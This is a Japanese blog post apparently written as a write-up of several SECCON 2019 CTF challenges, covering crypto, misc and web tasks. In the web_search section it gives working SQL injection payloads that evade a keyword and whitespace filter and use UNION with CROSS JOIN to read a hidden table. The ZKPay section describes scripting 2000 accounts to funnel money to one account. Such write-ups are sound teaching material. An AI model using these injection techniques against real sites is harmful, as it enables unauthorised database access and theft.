+++
title="[CTF Writeup] SECCON 2019 Online CTF"
description=""
date=2019-10-20

[taxonomies]
tags = ["CTF"]
#categories = ["programming", "misc.",]

[extra]
+++

<!-- bigimg: [{src: "/img/seccon-2019-online-ctf.png"}]
tags: ["CTF"] -->

[SECCON 2019](https://www.seccon.jp/2019/) 

チーム「./Vespiary」で出て 37 位 2402 点でした。
以下、自分が取り組んだ問題です（チームメンバーと解いたものを含む）。

<!-- {{< toc >}} -->

# [crypto] coffee_break
ソースコードを読んで逆算するプログラムを書けば良い。

```py
import sys
from Crypto.Cipher import AES
import base64

def decrypt(key, cipher):
    s = ''
    for i in range(len(cipher)):
        c = cipher[i] - 0x20 - (ord(key[i % len(key)]) - 0x20)
        if c < 0:
            c += (0x7e - 0x20 + 1)
        c += 0x20
        s += chr(c)
    return s

key1 = "SECCON"
key2 = "seccon2019"
cipher = AES.new(key2 + chr(0x00) * (16 - (len(key2) % 16)), AES.MODE_ECB)

encoded = "FyRyZNBO2MG6ncd3hEkC/yeYKUseI/CxYoZiIeV2fe/Jmtwx+WbWmU1gtMX9m905"

enc2 = base64.b64decode(encoded)
enc1_ = cipher.decrypt(enc2)

print(decrypt(key1, enc1_))
```

`SECCON{Success_Decryption_Yeah_Yeah_SECCON}`

# [misc] Beeeeeeeeeer
とりあえず与えられたシェルスクリプトを実行してみると、文字が増えたり消えたりするCUIアニメーションが表示される。シェルスクリプトで具体的に何が行われているか知るために**気合**で人力フォーマットと`echo`コマンドを駆使して解読していった。
適宜`bash -x`を使うことで楽に解読できる。

`SECCON{hogefuga3bash}`

# [crypto] ZKPay

signupにめちゃくちゃ時間がかかる。signupクエリを送った後に、homeへ移動してみると普通に利用できることがわかった。そこで、signupした直後にcreateQRをしてみたが、どうやら1分待たないと正常なQRコードが生成されない。

$1,000,000 / $500 = 2000 で自動化が現実的なので、2000個アカウントを生成してメインのアカウントにお金を送るスクリプトを書いた。

実行に3時間かかったが無事flagを得た。

![](https://i.gyazo.com/7be2f37c7e9749a01460b1d82a4c98a7.png)

# [web] web_search

適当に記号を入力してみると、`'`でErrorすることがわかる。
SQL injection を使う問題であることを疑い、色々実験すると、

- 空白文字` `が消える
- `,`が消える
- `or`,`and`が消える
- `oorr`が`or`になる
- `#`が効く
- `/**/`が空白代わりになる

などがわかる。

`#`が効くことからMySQLが使われていることが推測でき、
`'oorr'1'='1'#`で、
```
FLAG
The flag is "SECCON{Yeah_Sqli_Success_" ... well, the rest of flag is in "flag" table. 
Try more!
```
Flagの前半部分を得る。

`flag`テーブルにflagがあるようなので、UNIONを用いてflagを表示させたいが、`,`が消されるのでカラム数を合わせることが難しい。

CROSS JOIN を用いて、

`' OORR '1' = '1' /**/ UNION /**/ SELECT /**/ * /**/ FROM /**/ (SELECT /**/ * /**/ FROM /**/ flag)aaa /**/ CROSS /**/ JOIN /**/ (SELECT /**/ * /**/ FROM /**/ flag)bbb /**/ CROSS /**/ JOIN /**/ (SELECT /**/ * /**/ FROM /**/ flag)ccc#"`

を送信すると、フラグが得られる。

`SECCON{Yeah_Sqli_Success_You_Win_Yeah}`

# [crypto] Crazy Repetition of Codes

crc32は決定的な関数なので、鳩の巣原理よりcrcの値の周期が2^32以下であることがわかる。よって`int('1'*10000) % 周期`の回数crc32を実行すればいい。

# [misc] Sandstorm

![](https://i.gyazo.com/bb6d5672d1d08dbd55fcdfbef4c7384c.png)

画像に`My name is Adam`とあり、010 Editorなどのツールでファイルを見るとインターレースがAdam7になっているので[Adam7 algorithm - Wikipedia](https://en.wikipedia.org/wiki/Adam7_algorithm)が関係していそうとわかる。

これに着想を得て、8ピクセルごとにピクセルを抽出して画像にしてみると、

```py
from PIL import Image

img = Image.open('sandstorm.png')
W, H = img.size

img2 = Image.new('RGBA', (W//8, H//8))

for y in range(0,H//8):
    for x in range(0,W//8):
        img2.putpixel((x,y), img.getpixel((x*8,y*8)))

img2.save('img2.png')
```

![](https://i.gyazo.com/e5ccd541bf310d656aa11d8db1aec3d7.png)

QRコードが得られる。

`SECCON{p0nlMpzlCQ5AHol6}`

